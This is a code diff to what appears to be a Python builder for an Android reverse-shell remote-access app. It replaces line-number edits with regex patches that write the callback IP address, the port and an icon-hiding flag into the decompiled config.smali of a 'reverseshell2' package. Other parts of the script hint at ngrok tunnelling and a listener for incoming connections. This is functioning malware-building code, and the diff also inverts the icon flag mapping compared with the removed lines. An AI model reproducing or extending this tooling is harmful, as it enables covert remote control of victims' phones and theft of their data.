@@ -353,16 +353,47 @@ def connection_checker(socket,queue):
     return conn,addr
 
 
+def _patch_config_smali(editor, ip, port, icon):
+    """Patch IP, port, and icon flag in decompiled config.smali (line numbers may vary)."""
+    with open(editor, "r", encoding="utf-8") as f:
+        text = f.read()
+    text, n_ip = re.subn(
+        r'const-string v0, "[^"]*"\s*\n\s*sput-object v0, '
+        r'Lcom/example/reverseshell2/config;->IP',
+        'const-string v0, "' + ip + '"\n\n    sput-object v0, '
+        r'Lcom/example/reverseshell2/config;->IP',
+        text,
+        count=1,
+    )
+    text, n_port = re.subn(
+        r'const-string v0, "[^"]*"\s*\n\s*sput-object v0, '
+        r'Lcom/example/reverseshell2/config;->port',
+        'const-string v0, "' + port + '"\n\n    sput-object v0, '
+        r'Lcom/example/reverseshell2/config;->port',
+        text,
+        count=1,
+    )
+    icon_hex = "0x1" if icon else "0x0"
+    text, n_icon = re.subn(
+        r'const/4 v0, 0x[01]\s*\n\s*sput-boolean v0, '
+        r'Lcom/example/reverseshell2/config;->icon',
+        "const/4 v0, " + icon_hex + "\n\n    sput-boolean v0, "
+        r'Lcom/example/reverseshell2/config;->icon',
+        text,
+        count=1,
+    )
+    if n_ip == 0 or n_port == 0 or n_icon == 0:
+        raise ValueError(
+            "Could not patch config.smali — refresh Compiled_apk from Android_Code (see README)"
+        )
+    with open(editor, "w", encoding="utf-8") as f:
+        f.write(text)
+
+
 def build(ip,port,output,ngrok=False,ng=None,icon=None):
     editor = "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
     try:
-        file = open(editor,"r").readlines()
-        #Very much uncertaninity but cant think any other way to do it xD
-        file[18]=file[18][:21]+"\""+ip+"\""+"\n"
-        file[23]=file[23][:21]+"\""+port+"\""+"\n"
-        file[28]=file[28][:15]+" 0x0"+"\n" if icon else file[28][:15]+" 0x1"+"\n"
-        str_file="".join([str(elem) for elem in file])
-        open(editor,"w").write(str_file)
+        _patch_config_smali(editor, ip, port, icon)
     except Exception as e:
         print(e)
         sys.exit()
